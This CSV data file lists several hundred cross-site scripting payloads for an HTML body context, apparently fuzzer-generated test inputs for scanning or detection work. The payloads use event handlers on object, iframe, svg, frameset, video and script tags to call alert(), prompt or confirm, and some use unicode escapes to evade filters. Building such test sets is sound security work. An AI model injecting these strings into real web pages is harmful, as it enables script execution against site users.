eval_place,injection_code
body_tag,<object/onerror=javascript:alert();src=x data=saivs.html </embed>
body_tag,<iframe/onload=alert();src=x src=/ </frameset>
body_tag,<frameset><frame/onload=alert();src=x src=saivs.js </iframe>
body_tag,<iframe onload=alert();data=saivs.html </select><body/
body_tag,<body/onload=alert();data=saivs.html <svg </img>
body_tag,<object/data=saivs.html '<video><source onmouseover=alert();
body_tag,"<object onerror=al\u0065rt();type=""text/x-scriptlet"" <frameset><frame/src=/ "
body_tag,"<object onerror=javascript:alert();type=""text/x-scriptlet"" </frameset></canvas>"
body_tag,<body/onload=alert();data=saivs.html </a><a 
body_tag,<iframe onload=alert();prompt(1);><a 
body_tag,<object onerror=alert();>onmouseover=alert();<iframe/
body_tag,javascript:al\u0065rt();<object/data=saivs.html <frameset><frame/al\u0065rt``;
body_tag,onmouseover=alert();<object data=saivs.html </frameset>prompt(1);
body_tag,onload=alert();<object data=saivs.html </frameset>\u0061lert``;
body_tag,javascript:al\u0065rt();<object/data=saivs.html <frameset><frame/alert``;
body_tag,onmouseover=alert();<object data=saivs.html <frameset><frame/al\u0065rt``;
body_tag,onload=alert();<object/data=saivs.html <frameset><frame \u0061lert``;
body_tag,javascript:al\u0065rt();<object/data=saivs.html </frameset>\u0061lert``;
body_tag,<object/onerror=alert();><a <iframe/
body_tag,<object/data=saivs.html javascript:\u0061lert();</a>src=  
body_tag,<object/data=saivs.html <img/</canvas></frameset>
body_tag,<svg onload=alert();javascript:\u0061lert(); /> />
body_tag,<object/onerror=al\u0065rt();onerror=alert();confirm(1);>
body_tag,<object onerror=al\u0065rt();onerror=al\u0065rt();>confirm(1);
body_tag,<object onerror=javascript:alert();saivs.js > />
body_tag,data=<object onerror=javascript:alert();>onerror=\u0061lert();
body_tag,onerror=javascript:alert();<object/onerror=\u0061lert(); />javascript:al\u0065rt();
body_tag,"<video><source onerror=\u0061lert();type=""image"" <video><source </script>"
body_tag,<video><source/onerror=javascript:alert();><video><source <video><source/
body_tag,<script </iframe>al\u0065rt();</script><video><source/
body_tag,<object/data=saivs.html <img \u0061lert();</object>
body_tag,<object/data=saivs.html </img>onerror=alert();<object 
body_tag,<object/data=saivs.html </select>javascript:alert();saivs.js 
body_tag,<object data=saivs.html </object>onerror=javascript:alert();javascript:alert();
body_tag,"<object data=saivs.html </select>data=saivs.html data=""data:text/html,"
body_tag,<object data=saivs.html \u0061lert``;<select </canvas>
body_tag,<object data=saivs.html alert``;<svg/</embed>
body_tag,<object data=saivs.html al\u0065rt();</frameset>src=saivs.js 
body_tag,<object/data=saivs.html al\u0065rt``;<frameset><frame src=  
body_tag,"<object/onerror=javascript:alert();type=""image"" </iframe><img/"
body_tag,"<object/onerror=al\u0065rt();type=""text/x-scriptlet"" </iframe><option/"
body_tag,"<object/onerror=al\u0065rt();type=""text/x-scriptlet"" </iframe><img "
body_tag,"<object onerror=\u0061lert();type=""text/x-scriptlet"" <frameset><frame/</img>"
body_tag,<object/onerror=\u0061lert();data=saivs.html <svg </img>
body_tag,<object onerror=\u0061lert();data=saivs.html <frameset><frame <input 
body_tag,"<svg onload=alert();type=""image"" </frameset><img/"
body_tag,<svg/onload=alert();src=saivs.js <frameset><frame <img/
body_tag,<frameset><frame/onload=alert();data=saivs.html <frameset><frame/<img 
body_tag,"<svg onload=alert();type=""image"" <frameset><frame/<img/"
body_tag,"<frameset><frame/onload=alert();type=""image"" <svg/</img>"
body_tag,<object/saivs.js data=saivs.html </frameset></img>
body_tag,<frameset><frame/onload=alert();src=x </frameset></img>
body_tag,<frameset><frame onload=alert();src=saivs.js </frameset></img>
body_tag,<frameset><frame onload=alert();src=x </frameset><body 
body_tag,<frameset><frame <iframe/onload=alert();confirm(1);>
body_tag,<object <body onerror=al\u0065rt(); />>
body_tag,<object data=saivs.html onload=alert();</a></select>
body_tag,<object data=saivs.html \u0061lert();<video><source/<object 
body_tag,<object data=saivs.html confirm(1);<video><source/<svg/
body_tag,<object/onerror=\u0061lert();saivs.js <script/<frameset><frame/
body_tag,<object onerror=al\u0065rt();><img/</object>
body_tag,<iframe/onload=alert();><onerror=alert();
body_tag,<img/onerror=javascript:alert();src=x src=saivs.js <frameset><frame 
body_tag,</img>onerror=al\u0065rt();<embed/<embed <iframe 
body_tag,<object data=saivs.html <embed/</object><frameset><frame 
body_tag,<object/data=saivs.html <select </frameset><svg 
body_tag,<object data=saivs.html </object><frameset><frame </select>
body_tag,<object data=saivs.html <object/</frameset></select>
body_tag,<object data=saivs.html <object/</frameset><embed 
body_tag,<object/data=saivs.html data=saivs.html <a </a>
body_tag,<object/data=saivs.html onerror=javascript:alert();<a/</a>
body_tag,<object/data=saivs.html data=</a><img/
body_tag,<body/<svg/onload=alert();><video><source 
body_tag,<body <iframe/onload=alert(); </script>
body_tag,<object/<embed data=saivs.html /<video><source 
body_tag,<body/<select onload=alert(); </script>
body_tag,</img><object onerror=al\u0065rt(); <script>
body_tag,<object/data=saivs.html <embed/</img><img/
body_tag,<object/data=saivs.html src=/ </iframe></img>
body_tag,<object/data=saivs.html src=  <frameset><frame/<img 
body_tag,<object data=saivs.html data=saivs.html <object </img>
body_tag,src=saivs.js <object data=saivs.html <object/<frameset><frame 
body_tag,data=<object/data=saivs.html </canvas><body/
body_tag,'<object <canvas/onerror=alert();>
body_tag,<video><source/onerror=alert(); />alert``; 
body_tag,<video><source/onerror=alert(); />onload=alert(); 
body_tag,<video><source/onerror=alert();>onload=alert(); 
body_tag,<script onmouseover=alert();>onerror=alert();/
body_tag,<script/</a>prompt(1);</script> 
body_tag,<object/data=saivs.html <video><source </a>/
body_tag,<object data=saivs.html <video><source/<option//
body_tag,<object/data=saivs.html <video><source <option//
body_tag,<object data=saivs.html </script><video><source/ 
body_tag,<object/onerror=alert();><embed <iframe 
body_tag,<svg onload=alert(); /><canvas/<body 
body_tag,<object/onerror=javascript:alert();><embed <img 
body_tag,al\u0065rt``;<object data=saivs.html  /><body 
body_tag,al\u0065rt``;<object onerror=al\u0065rt();><option 
body_tag,"javascript:al\u0065rt();<object/onerror=al\u0065rt();type=""text/x-scriptlet"" <frameset><frame/"
body_tag,<object/<canvas data=saivs.html <object/</iframe>
body_tag,<object <select/data=saivs.html </select></iframe>
body_tag,<object/<select data=saivs.html <select <frameset><frame 
body_tag,<object <select data=saivs.html <object/</object>
body_tag,<object <canvas/data=saivs.html <embed </select>
body_tag,<object data=saivs.html </select><object/<
body_tag,<object data=saivs.html </iframe></img><input 
body_tag,<frameset><frame/onload=alert();javascript:al\u0065rt();><a/
body_tag,<body/onload=alert();al\u0065rt(); /><body 
body_tag,<video><source/onerror=al\u0065rt(); />#\u0061lert``;
body_tag,"<object/data=saivs.html src=""data:text/html,src=""data:text/html,</canvas>"
body_tag,<object/data=saivs.html onload=alert();</img><input 
body_tag,"<object/data=saivs.html onload=alert();""</a><input "
body_tag,<svg/onload=alert();javascript:alert(); />confirm(1);
body_tag,<object <svg <body/data=saivs.html </img>
body_tag,<object data=saivs.html </frameset><option <embed/
body_tag,<video><source/onerror=\u0061lert();>/#
body_tag,"<object data=saivs.html <frameset><frame/data=""data:text/html,<body/"
body_tag,</frameset>data=saivs.html <object data=saivs.html </img>
body_tag,<object/data=saivs.html <frameset><frame/data=saivs.html <img/
body_tag,<object data=saivs.html <svg/javascript:alert();</img>
body_tag,<iframe/onload=alert();\u0061lert``;><frameset><frame/
body_tag,"<body onload=alert();"""" /><select "
body_tag,</iframe><svg/onload=alert();><a 
body_tag,</iframe><object data=saivs.html ><a 
body_tag,"<body onload=alert();type=""text/x-scriptlet"" </a><svg "
body_tag,</frameset><object/data=saivs.html </embed><option/
body_tag,</select><object data=saivs.html <select/</a>
body_tag,</embed><object data=saivs.html </object><img 
body_tag,alert();<object <embed/data=saivs.html </canvas>
body_tag,alert();<object data=saivs.html </select><iframe 
body_tag,"type=""image"" <object data=saivs.html </object></a>"
body_tag,</object><object data=saivs.html <frameset><frame/<option/
body_tag,<object/<embed data=saivs.html <frameset><frame/<option/
body_tag,<object data=saivs.html src=/ <option </iframe>
body_tag,<object/data=saivs.html src=  </a>src=/ 
body_tag,<object <object/data=saivs.html </img><object/
body_tag,</object><iframe onload=alert();><input 
body_tag,<object/data=saivs.html </canvas>#<script/
body_tag,<object/data=saivs.html </object><iframe <select/
body_tag,<object/onerror=javascript:alert();src=x <body </frameset>
body_tag,javascript:alert();<iframe/onload=alert();saivs.js <video><source 
body_tag,<object/data=saivs.html <select <svg <frameset><frame 
body_tag,<object data=saivs.html </object></object><object/
body_tag,<object data=saivs.html <object </frameset></frameset>
body_tag,<object data=saivs.html data=saivs.html </object>>
body_tag,<object/data=saivs.html </select>onerror=alert();alert``;
body_tag,data=<iframe/<canvas/onload=alert();>
body_tag,src=saivs.js </img><iframe/onload=alert(); />
body_tag,<video><source/onerror=alert(); <script/<frameset><frame 
body_tag,<script>al\u0065rt(); </script>al\u0065rt``;
body_tag,<script>alert``; </script><
body_tag,<script>alert``; </script>>
body_tag,<script>prompt(1); </script>>
body_tag,<script>alert``; </script>#
body_tag,<script>alert(); </script>>
body_tag,<video><source onerror=\u0061lert(); <video><source/al\u0065rt``;
body_tag,<video><source onerror=al\u0065rt(); <video><source/\u0061lert``;
body_tag,<video><source/onerror=\u0061lert(); <video><source >
body_tag,onload=alert();<object/data=saivs.html <video><source <script 
body_tag,<object data=saivs.html  /></select><video><source/
body_tag,<object/onerror=javascript:alert();saivs.js </canvas><script/
body_tag,<body onload=alert(); />onerror=javascript:alert();<video><source/
body_tag,"<body/onload=alert();"""" /><a "
body_tag,</iframe>src=/ <object/data=saivs.html </canvas>
body_tag,<object data=saivs.html <object <object </select>
body_tag,<object/data=saivs.html </object><iframe <object 
body_tag,<object data=saivs.html <canvas </img><svg/
body_tag,<object/data=saivs.html </embed><img <iframe 
body_tag,"<iframe/type=""image"" onload=alert();><img "
body_tag,"<object data=saivs.html </img>type=""text/x-scriptlet"" \u0061lert``;"
body_tag,<object data=saivs.html </iframe><a/saivs.js 
body_tag,<body/onload=alert();data=saivs.html <img/ />
body_tag,<video><source/onerror=alert(); /><video><source  
body_tag,<script/onerror=\u0061lert();alert``;<video><source/ 
body_tag,"<iframe/onload=alert();type=""text/x-scriptlet"" <frameset><frame confirm(1);"
body_tag,<object/data=saivs.html </frameset>javascript:alert();<a/
body_tag,"<object onerror=javascript:alert();type=""text/x-scriptlet"" onload=alert(); />"
body_tag,"<object onerror=javascript:alert();src=x "" />"
body_tag,"<object/data=saivs.html </object>onerror=\u0061lert();data=""data:text/html,"
body_tag,<iframe/onload=alert();javascript:alert(); />/
body_tag,<object/data=saivs.html <video><source//<option/
body_tag,<object data=saivs.html <img ></img>
body_tag,"data=""data:text/html,<object/onerror=\u0061lert(); /><a "
body_tag,</embed><object/data=saivs.html  /><script/
body_tag,<video><source/onerror=javascript:alert();>al\u0065rt();<input/
body_tag,<object/onerror=al\u0065rt();src=x javascript:al\u0065rt();</a>
body_tag,<body/onload=alert();src=saivs.js  /><script 
body_tag,<body onload=alert();javascript:al\u0065rt();><a/
body_tag,<iframe onload=alert();javascript:alert();></a>
body_tag,<body/onload=alert();onmouseover=alert();><a 
body_tag,<iframe javascript:\u0061lert();onerror=\u0061lert();prompt(1);<a/
body_tag,<object onerror=\u0061lert();onerror=\u0061lert(); /><a/
body_tag,<object onerror=al\u0065rt();data=saivs.html confirm(1);</a>
body_tag,"data=""data:text/html,<iframe/<embed/onload=alert(); />"
body_tag,<object/<object/onerror=\u0061lert(); />saivs.js 
body_tag,<object/data=saivs.html src=/ <script/</embed>
body_tag,<object/<embed onerror=\u0061lert(); /><canvas/
body_tag,<object onerror=javascript:alert();src=saivs.js prompt(1);</canvas>
body_tag,<object/data=saivs.html <embed ><embed/
body_tag,<object/onerror=alert();<select data=saivs.html <frameset><frame 
body_tag,"<object/onerror=javascript:alert();type=""text/x-scriptlet"" src=  </img>"
body_tag,"<body onload=alert(); <video><source/"""
body_tag,<body/onload=alert(); <video><source/al\u0065rt``;
body_tag,<object/onerror=javascript:alert(); </script>#
body_tag, <script>alert(); </script>
body_tag,<object/data=saivs.html <body onmouseover=alert();</select>
body_tag,alert``;<object data=saivs.html javascript:alert();>
body_tag,\u0061lert``;<svg/onload=alert();onerror=alert(); />
body_tag,"""<option/al\u0065rt``;\u0061lert();#"
body_tag,"\u0061lert();<iframe onload=alert();""onload=alert();"">"
body_tag,"type=""image"" <object onerror=al\u0065rt();javascript:al\u0065rt();>"
body_tag,</object><object onerror=\u0061lert();onerror=alert();>
body_tag,<object/<object onerror=alert();javascript:\u0061lert();>
body_tag,<object <select data=saivs.html onerror=\u0061lert(); />
body_tag,<svg/<object/saivs.js onload=alert();>
body_tag,<body onload=alert();src=x <frameset><frame/<img/
body_tag,<frameset><frame <select/<script/onload=alert(); />
body_tag,<object/<canvas/<script/onerror=alert();>
body_tag,<object src=/ data=saivs.html <input </iframe>
body_tag,"<object onerror=\u0061lert();javascript:alert();type=""image"" </iframe>"
body_tag,"<object onerror=javascript:alert();type=""text/x-scriptlet"" javascript:\u0061lert();</object>"
body_tag,<object/data=saivs.html confirm(1);<frameset><frame/ />
body_tag,<object data=saivs.html onload=alert();</frameset><
body_tag,<object data=saivs.html onerror=javascript:alert();</iframe>al\u0065rt();
body_tag,<object data=saivs.html </embed></canvas>saivs.js 
body_tag,<object <embed data=saivs.html </embed></img>
body_tag,"<object data=saivs.html onload=alert();""<script><video><source/"
body_tag,<object/data=saivs.html alert();</script><video><source/
body_tag,"<body onload=alert();type=""text/x-scriptlet"" <a/</a>"
body_tag,</frameset><object onerror=al\u0065rt();>javascript:\u0061lert();
body_tag,<object onerror=\u0061lert();data=saivs.html <select </embed>
body_tag,<svg onload=alert();src=saivs.js <svg </canvas>
body_tag,<object onerror=alert();src=saivs.js </iframe>src=x 
body_tag,"<frameset><frame onload=alert();""onload=alert();""<object <frameset><frame "
body_tag,<frameset><frame/onload=alert();javascript:alert();src=x <frameset><frame/
body_tag,<iframe/onload=alert();javascript:al\u0065rt();src=x <frameset><frame 
body_tag,"<iframe/onload=alert();""onload=alert();""<select </iframe>"
body_tag,<frameset><frame/onload=alert();saivs.js </object><iframe 
body_tag,<object/<canvas onerror=alert();saivs.js </iframe>
body_tag,<svg <iframe onload=alert();><embed 
body_tag,"</frameset><frameset><frame/onload=alert(); />type=""text/x-scriptlet"" "
body_tag,<iframe/<iframe/onload=alert(); />alert``;
body_tag,</frameset><frameset><frame/onload=alert();>al\u0065rt``;
body_tag,<object <iframe onerror=alert();>alert``;
body_tag,<frameset><frame <input/onload=alert(); />confirm(1);
body_tag,<frameset><frame/<input onload=alert();prompt(1); />
body_tag,<iframe <input onload=alert(); />/
body_tag,"<frameset><frame/<body onload=alert(); />"""
body_tag,<object/<input/onerror=alert();>#
body_tag,</frameset><object/onerror=al\u0065rt();src=saivs.js <video><source 
body_tag,><script/</a>\u0061lert();</script>
body_tag,<script/al\u0065rt();</a>onerror=\u0061lert();</script>
body_tag,<frameset><frame onload=alert();src=saivs.js </embed>saivs.js 
body_tag,data=<object saivs.js onerror=javascript:alert(); />
body_tag,<video><source/onerror=al\u0065rt(); /><video><source//
body_tag,<script>javascript:\u0061lert();prompt(1);</script> 
body_tag,<video><source/onerror=\u0061lert();></a>#
body_tag,<script>javascript:al\u0065rt();onerror=alert();</script> 
body_tag,src=x <iframe onload=alert(); /><option 
body_tag,<object/<object onerror=alert();><script/
body_tag,</embed><object onerror=alert(); /></img>
body_tag,<object/src=saivs.js onerror=alert();><a/
body_tag,<iframe/data=saivs.html onload=alert();><a/
body_tag,<iframe/onload=alert();saivs.js  /></a>
body_tag,<object/onerror=javascript:alert();onmouseover=alert(); /><option 
body_tag,<object/onerror=javascript:alert();al\u0065rt(); /><img/
body_tag,<svg/onload=alert();al\u0065rt();><script/
body_tag,<object/saivs.js onerror=al\u0065rt();><input 
body_tag,alert``;<svg onload=alert();saivs.js </frameset>
body_tag,javascript:al\u0065rt();<object data=saivs.html \u0061lert();<frameset><frame 
body_tag,src=  <object data=saivs.html onerror=alert();</select>
body_tag,</embed><object onerror=javascript:alert();saivs.js </select>
body_tag,<svg/<object/onload=alert();saivs.js </embed>
body_tag,<script/src=saivs.js <video><source <body/</script>
body_tag,<script>\u0061lert(); </script><script>
body_tag,<video><source onerror=alert(); </script><script>
body_tag,<video><source/onerror=javascript:alert(); /><a <video><source 
body_tag,<video><source onerror=alert(); </script><script>
body_tag,<video><source onerror=\u0061lert(); </script><script>
body_tag,<video><source/onerror=\u0061lert(); <script><script>
body_tag,<video><source src=/  <script><script>
body_tag,onerror=\u0061lert();<object/onerror=al\u0065rt(); /><select/
